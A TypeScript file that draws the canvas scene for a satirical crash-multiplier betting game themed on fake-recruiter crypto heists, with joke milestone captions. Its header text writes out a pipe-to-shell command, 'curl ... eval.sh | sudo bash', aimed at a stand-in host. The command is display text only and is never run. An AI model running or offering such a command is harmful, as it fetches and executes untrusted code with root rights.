import { pageAudio } from './audio';

export interface SceneView {
  phase: 'waiting' | 'betting' | 'running' | 'crashed';
  currentX100: number;
  elapsed: number;
  crashAge: number;
  stake: number | null;
  cashoutX100: number | null;
  payout: number | null;
}

export interface Scene {
  draw(ctx: CanvasRenderingContext2D, view: SceneView, now: number): void;
  dispose?(): void;
}

const COLOURS = {
  bg: '#0a0d18',
  serverDark: '#121829',
  serverRack: '#1c2540',
  cyanGlow: '#00e5ff',
  dangerRed: '#ff2a6d',
  amberWarn: '#ffb300',
  text: '#f0f6fc',
  muted: '#8b9bb4',
  cashedOut: '#05ffa1',
  crashed: '#ff3366',
};

const MILESTONES: [x100: number, caption: string][] = [
  [120, 'Recruiter sends link for coding assessment'],
  [150, 'Dev runs npm install with sudo flag'],
  [200, 'Fake CEO joins video call wearing sunglasses'],
  [250, 'Homebrew alert pops up and is ignored'],
  [300, 'Multisig signing prompt flashes on second screen'],
  [500, 'Hot wallet starts bleeding eight digits a minute'],
  [1000, 'Security software marks script as verified friend'],
  [10000, 'Global crypto bridge locks in panic freeze'],
  [100000, 'Lazarus hacker sends thank-you gift basket'],
  [1000000, 'Entire cloud cluster transforms into a toaster'],
];

const formatX = (x100: number) => `${(x100 / 100).toFixed(2)}×`;
const credits = (n: number) => `${n.toLocaleString('en-US')} ${n === 1 ? 'credit' : 'credits'}`;
const clamp01 = (v: number) => Math.min(1, Math.max(0, v));

function stakeLine(view: SceneView): [text: string, colour: string] {
  const crashed = view.phase === 'crashed';
  if (view.cashoutX100 !== null) {
    return [`Unplugged & Escaped at ${formatX(view.cashoutX100)} · Bonus Secured!`, COLOURS.cashedOut];
  }
  if (view.stake === null) {
    return [crashed ? 'Security locked the server closet · Spectating' : 'Watching interview · No credits on the line', COLOURS.muted];
  }
  if (crashed) return [`Badge revoked! Lost ${credits(view.stake)} in the vault`, COLOURS.crashed];
  return [`Interrogating server · ${credits(view.stake)} riding`, COLOURS.cyanGlow];
}

export function createScene(): Scene {
  const audio = pageAudio({ style: 'synthwave', crash: 'siren' });

  let prevPhase: SceneView['phase'] | null = null;
  let prevCashout: number | null = null;
  let prevMilestone = 0;
  let fanAngle = 0;

  function drawServerRack(ctx: CanvasRenderingContext2D, x: number, y: number, w: number, h: number, tension: number, crashed: boolean) {
    ctx.fillStyle = COLOURS.serverRack;
    ctx.fillRect(x, y, w, h);
    ctx.strokeStyle = '#2d3b5e';
    ctx.strokeRect(x, y, w, h);

    const unitH = 26;
    const units = Math.floor(h / unitH);
    for (let i = 0; i < units; i++) {
      const uy = y + i * unitH;
      ctx.fillStyle = COLOURS.serverDark;
      ctx.fillRect(x + 4, uy + 3, w - 8, unitH - 6);

      // Blinking status LEDs
      const isHot = (i + Math.floor(fanAngle * 0.1)) % 3 === 0;
      ctx.fillStyle = crashed ? COLOURS.dangerRed : (tension > 0.4 && isHot ? COLOURS.dangerRed : (isHot ? COLOURS.amberWarn : COLOURS.cyanGlow));
      ctx.beginPath();
      ctx.arc(x + 14, uy + unitH / 2, 3, 0, Math.PI * 2);
      ctx.fill();

      // Activity drive slots
      ctx.fillStyle = '#090e1a';
      ctx.fillRect(x + 24, uy + 7, w - 32, 4);
    }
  }

  function drawZoomCall(ctx: CanvasRenderingContext2D, x: number, y: number, tension: number, crashed: boolean) {
    ctx.fillStyle = '#0f172a';
    ctx.fillRect(x, y, 150, 95);
    ctx.strokeStyle = '#38bdf8';
    ctx.lineWidth = 2;
    ctx.strokeRect(x, y, 150, 95);

    // Call header
    ctx.fillStyle = '#1e293b';
    ctx.fillRect(x, y, 150, 16);
    ctx.fillStyle = COLOURS.dangerRed;
    ctx.beginPath();
    ctx.arc(x + 10, y + 8, 3.5, 0, Math.PI * 2);
    ctx.fill();
    ctx.fillStyle = COLOURS.text;
    ctx.font = '8px monospace';
    ctx.fillText('REC 🔴 [WEB3 RECRUITER]', x + 20, y + 11);

    if (crashed) {
      // Skull video feed
      ctx.fillStyle = COLOURS.dangerRed;
      ctx.font = 'bold 24px monospace';
      ctx.textAlign = 'center';
      ctx.fillText('☠ LOCKED', x + 75, y + 60);
      ctx.textAlign = 'left';
    } else {
      // Recruiter avatar with shades
      ctx.fillStyle = '#fbcfe8';
      ctx.beginPath();
      ctx.arc(x + 75, y + 52, 18, 0, Math.PI * 2);
      ctx.fill();
      // Sunglasses
      ctx.fillStyle = '#020617';
      ctx.fillRect(x + 64, y + 46, 22, 7);
      // Smirk
      ctx.strokeStyle = '#020617';
      ctx.lineWidth = 1.5;
      ctx.beginPath();
      ctx.arc(x + 75, y + 57, 5, 0.1, Math.PI * 0.9);
      ctx.stroke();

      // Recruiter dialogue popup
      if (tension > 0.2) {
        ctx.fillStyle = '#e2e8f0';
        ctx.font = '7px sans-serif';
        const msg = tension > 0.6 ? '"Just ignore the sudo alert!"' : '"Great code! Just run the shell script"';
        ctx.fillText(msg, x + 6, y + 85);
      }
    }
  }

  function draw(ctx: CanvasRenderingContext2D, view: SceneView, _now: number): void {
    const running = view.phase === 'running';
    const crashed = view.phase === 'crashed';
    const cashed = view.cashoutX100 !== null;
    const tension = clamp01(1 - 100 / view.currentX100);
    const depth = clamp01(Math.log10(view.currentX100 / 100) / 3);

    audio.update(view.phase, tension);
    fanAngle += (1 + tension * 12);

    const milestone = MILESTONES.filter(([x100]) => view.currentX100 >= x100).length;
    if (prevPhase !== null && running && cashed && prevCashout === null) {
      audio.cashout();
      audio.fx('yeet', 0.9);
    }
    if (crashed && prevPhase !== 'crashed') {
      audio.crash('siren', prevPhase === null || view.crashAge > 1500);
    }
    if (running && prevPhase === 'running' && milestone > prevMilestone) {
      audio.milestone(milestone);
      audio.fx('notify', 0.5 + 0.5 * tension);
    }
    prevPhase = view.phase;
    prevCashout = view.cashoutX100;
    prevMilestone = milestone;

    // Shake & Crash physics
    const crashAgeSec = crashed ? Math.max(0, view.crashAge / 1000) : 0;
    const shake = crashed ? 14 * clamp01(1 - crashAgeSec / 0.7) ** 2 : (tension > 0.7 ? Math.sin(fanAngle * 0.8) * 1.5 : 0);

    ctx.save();
    ctx.translate(shake * Math.sin(crashAgeSec * 80), shake * Math.cos(crashAgeSec * 60));

    // Background server closet
    ctx.fillStyle = COLOURS.bg;
    ctx.fillRect(0, 0, 960, 540);

    // Emergency lights if high tension or crashed
    if (crashed || tension > 0.55) {
      const flash = (Math.sin(fanAngle * 0.15) + 1) * 0.5;
      const alpha = crashed ? Math.max(0.15, 0.45 * (1 - crashAgeSec / 1.5)) : flash * 0.15 * tension;
      ctx.fillStyle = `rgba(255, 30, 80, ${alpha})`;
      ctx.fillRect(0, 0, 960, 540);
    }

    // Server Racks left & right
    drawServerRack(ctx, 40, 100, 120, 360, tension, crashed);
    drawServerRack(ctx, 800, 100, 120, 360, tension, crashed);

    // Spinning hot server fans
    const drawFan = (fx: number, fy: number) => {
      ctx.save();
      ctx.translate(fx, fy);
      ctx.strokeStyle = crashed ? COLOURS.dangerRed : (tension > 0.5 ? '#ff5722' : '#475569');
      ctx.lineWidth = 3;
      ctx.beginPath();
      ctx.arc(0, 0, 18, 0, Math.PI * 2);
      ctx.stroke();
      ctx.rotate(fanAngle * 0.05);
      for (let b = 0; b < 3; b++) {
        ctx.rotate((Math.PI * 2) / 3);
        ctx.fillStyle = crashed ? COLOURS.dangerRed : (tension > 0.4 ? '#ff7043' : '#64748b');
        ctx.fillRect(-3, -15, 6, 15);
      }
      ctx.restore();
    };
    drawFan(100, 70);
    drawFan(860, 70);

    // Ethernet cable running across floor
    ctx.strokeStyle = cashed ? '#94a3b8' : (tension > 0.5 ? COLOURS.dangerRed : '#38bdf8');
    ctx.lineWidth = 3;
    ctx.beginPath();
    ctx.moveTo(160, 420);
    if (cashed) {
      // Snapped wire!
      ctx.bezierCurveTo(240, 440, 300, 470, 340, 480);
      ctx.stroke();
      // Sparks
      ctx.fillStyle = '#fef08a';
      ctx.beginPath();
      ctx.arc(344, 480, 4 + Math.sin(fanAngle) * 2, 0, Math.PI * 2);
      ctx.fill();
    } else {
      ctx.bezierCurveTo(240, 440, 380, 470, 470, 410);
      ctx.stroke();
    }

    // Dev desk setup
    const deskX = 360;
    const deskY = 320;
    ctx.fillStyle = '#1e293b';
    ctx.fillRect(deskX, deskY + 60, 240, 15); // Desk top
    ctx.fillStyle = '#0f172a';
    ctx.fillRect(deskX + 20, deskY + 75, 12, 100); // Leg L
    ctx.fillRect(deskX + 208, deskY + 75, 12, 100); // Leg R

    // Zoom call monitor above desk
    drawZoomCall(ctx, deskX + 45, deskY - 45, tension, crashed);

    // Protagonist & Ergonomic Gaming Chair
    ctx.save();
    let chairX = deskX + 110;
    let chairY = deskY + 50;

    if (cashed) {
      // Scooting away rightwards!
      const scoot = Math.min(220, (view.elapsed % 10000) * 0.2);
      chairX += scoot;
    } else if (crashed) {
      // Tipped backwards by security tackle
      chairX -= 30;
      chairY += 15;
      ctx.translate(chairX, chairY);
      ctx.rotate(-0.35);
      ctx.translate(-chairX, -chairY);
    }

    // Chair base & back
    ctx.fillStyle = '#090d16';
    ctx.beginPath();
    ctx.roundRect(chairX - 35, chairY - 60, 24, 70, 8);
    ctx.fill();
    ctx.fillStyle = '#ff2a6d';
    ctx.fillRect(chairX - 32, chairY - 50, 6, 50); // Racing stripes
    // Seat
    ctx.fillStyle = '#1e293b';
    ctx.fillRect(chairX - 35, chairY + 10, 45, 12);
    // Wheels
    ctx.fillStyle = '#64748b';
    ctx.fillRect(chairX - 28, chairY + 45, 30, 5);
    ctx.fillRect(chairX - 15, chairY + 22, 6, 23);

    // Dev figure
    if (cashed) {
      // Escaping hero holding bag of cash bonus
      ctx.fillStyle = '#38bdf8'; // Hoodie
      ctx.fillRect(chairX - 15, chairY - 30, 26, 38);
      // Head looking back grinning
      ctx.fillStyle = '#fed7aa';
      ctx.beginPath();
      ctx.arc(chairX - 2, chairY - 42, 14, 0, Math.PI * 2);
      ctx.fill();
      // Bonus sack
      ctx.fillStyle = '#10b981';
      ctx.beginPath();
      ctx.arc(chairX + 22, chairY - 10, 16, 0, Math.PI * 2);
      ctx.fill();
      ctx.fillStyle = '#047857';
      ctx.font = 'bold 14px monospace';
      ctx.fillText('$', chairX + 17, chairY - 5);
    } else if (crashed) {
      // Dev flailing as security tackles
      ctx.fillStyle = '#38bdf8';
      ctx.fillRect(chairX - 10, chairY - 30, 26, 38);
      ctx.fillStyle = '#fed7aa';
      ctx.beginPath();
      ctx.arc(chairX + 4, chairY - 42, 14, 0, Math.PI * 2);
      ctx.fill();

      // Security officer arms grabbing chair
      ctx.fillStyle = '#0f172a';
      ctx.fillRect(chairX + 40, chairY - 40, 45, 14);
      ctx.fillStyle = '#fbbf24';
      ctx.font = 'bold 10px sans-serif';
      ctx.fillText('HR SEC', chairX + 45, chairY - 29);
    } else {
      // Typing & sweating dev
      const typeWiggle = Math.sin(fanAngle * 0.7) * 2;
      ctx.fillStyle = '#0284c7';
      ctx.fillRect(chairX - 15, chairY - 28, 25, 38); // Body
      // Arms typing on laptop
      ctx.fillStyle = '#fed7aa';
      ctx.fillRect(chairX + 5, chairY - 10 + typeWiggle, 24, 8);
      // Head
      ctx.beginPath();
      ctx.arc(chairX - 2, chairY - 42, 14, 0, Math.PI * 2);
      ctx.fill();
      // Sweaty drops flying off
      if (tension > 0.15) {
        ctx.fillStyle = '#67e8f9';
        const sweatY = chairY - 45 + (view.elapsed * 0.15) % 30;
        ctx.beginPath();
        ctx.arc(chairX - 18, sweatY, 2.5, 0, Math.PI * 2);
        ctx.arc(chairX + 16, sweatY - 5, 2, 0, Math.PI * 2);
        ctx.fill();
      }
    }
    ctx.restore();

    // Glowing MacBook on desk
    const laptopX = deskX + 85;
    const laptopY = deskY + 36;
    if (cashed) {
      // Clapped shut
      ctx.fillStyle = '#94a3b8';
      ctx.fillRect(laptopX, laptopY + 20, 48, 5);
    } else {
      // Laptop base
      ctx.fillStyle = '#cbd5e1';
      ctx.fillRect(laptopX, laptopY + 20, 50, 4);
      // Screen open
      ctx.fillStyle = '#1e293b';
      ctx.fillRect(laptopX + 8, laptopY - 22, 38, 42);
      // Terminal screen glow
      ctx.fillStyle = crashed ? COLOURS.dangerRed : (tension > 0.5 ? '#f43f5e' : '#10b981');
      ctx.fillRect(laptopX + 10, laptopY - 20, 34, 38);
      // Terminal fake code lines
      ctx.fillStyle = '#ffffff';
      ctx.fillRect(laptopX + 12, laptopY - 14, 18, 2);
      ctx.fillRect(laptopX + 12, laptopY - 9, 26, 2);
      ctx.fillRect(laptopX + 12, laptopY - 4, 14, 2);
    }

    // Giant Ransomware Skull Overlay on Crash
    if (crashed) {
      const alpha = Math.min(0.85, crashAgeSec * 2);
      ctx.fillStyle = `rgba(0, 0, 0, ${alpha * 0.75})`;
      ctx.fillRect(200, 120, 560, 230);
      ctx.strokeStyle = COLOURS.dangerRed;
      ctx.lineWidth = 4;
      ctx.strokeRect(200, 120, 560, 230);

      // Skull art in canvas
      ctx.fillStyle = COLOURS.dangerRed;
      ctx.font = 'bold 36px monospace';
      ctx.textAlign = 'center';
      ctx.fillText('☠ BADGE REVOKED ☠', 480, 175);
      ctx.font = '16px monospace';
      ctx.fillStyle = '#ff80bf';
      ctx.fillText('MULTISIG LOCKED SERVER CLOSET · ASSETS FORFEIT', 480, 210);
      ctx.fillStyle = '#ffffff';
      ctx.font = '14px monospace';
      ctx.fillText('TERMINAL RANSOMWARE ACTIVATED: take_home_test.sh', 480, 240);
      ctx.textAlign = 'left';
    }

    // Top HUD Bar: Game Title & Subtitle
    ctx.textAlign = 'center';
    ctx.fillStyle = COLOURS.text;
    ctx.font = '700 28px system-ui, sans-serif';
    ctx.fillText('FAKE OFFER HEIST', 480, 42);
    ctx.font = '500 14px monospace';
    ctx.fillStyle = tension > 0.4 ? COLOURS.amberWarn : COLOURS.muted;
    ctx.fillText('CURL -sSL https://fake-interview-repo.io/eval.sh | SUDO BASH', 480, 66);

    // Multiplier Display
    const multColor = crashed ? COLOURS.crashed : (cashed ? COLOURS.cashedOut : COLOURS.cyanGlow);
    ctx.fillStyle = multColor;
    const multSize = 58 + 10 * tension + (crashed ? 8 : 0);
    ctx.font = `800 ${multSize}px ui-monospace, monospace`;
    ctx.fillText(formatX(view.currentX100), 480, 145);

    // Progress bar for the test download
    const barW = 320;
    const barH = 10;
    const barX = 480 - barW / 2;
    const barY = 165;
    ctx.fillStyle = '#1e293b';
    ctx.fillRect(barX, barY, barW, barH);
    ctx.fillStyle = multColor;
    ctx.fillRect(barX, barY, barW * depth, barH);
    ctx.strokeStyle = '#334155';
    ctx.lineWidth = 1;
    ctx.strokeRect(barX, barY, barW, barH);

    // Milestone Caption
    const passed = running || crashed ? MILESTONES[milestone - 1] : undefined;
    const caption = passed?.[1] ?? (view.phase === 'betting' ? 'Ready to accept recruiter invitation...' : 'Waiting for next round...');
    ctx.font = '600 18px system-ui, sans-serif';
    ctx.fillStyle = COLOURS.text;
    ctx.fillText(caption, 480, 480);

    // Stake / Escape status line
    const [line, colour] = stakeLine(view);
    ctx.fillStyle = colour;
    ctx.font = '700 20px system-ui, sans-serif';
    ctx.fillText(line, 480, 512);

    ctx.restore();
  }

  return { draw };
}
